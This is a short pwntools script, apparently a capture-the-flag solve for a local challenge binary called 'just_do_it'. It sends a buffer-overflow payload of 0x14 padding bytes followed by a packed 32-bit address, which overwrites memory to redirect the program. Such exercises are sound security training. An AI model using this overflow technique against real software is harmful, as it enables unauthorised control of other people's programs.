from pwn import *
elf = process('./just_do_it')
context.log_level = "DEBUG"

payload = b"A" * 0x14 + p32(0x0804a080)

elf.sendline(payload)
